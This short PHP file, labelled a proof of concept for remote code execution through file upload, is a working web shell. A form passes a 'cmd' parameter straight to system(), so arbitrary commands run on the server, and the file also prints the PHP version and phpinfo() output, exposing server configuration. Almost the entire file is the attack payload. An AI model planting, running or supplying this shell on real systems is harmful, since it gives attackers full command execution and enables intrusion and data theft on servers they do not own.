<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <title>PHP file upload rce</title>
  </head>
  <h1>g30rgy PoC for RCE
  <h2>
<?php
  //get php version/info
  echo 'curent phpversion: '. phpversion();
?>
<form action="" method="get">
cmd: <input type="text" name="cmd">
<input type="submit">
<?php
//get input for above form
system($_GET["cmd"]);
?>
<?php
  //get php version/info
  echo ''. phpinfo();
?>
</html>
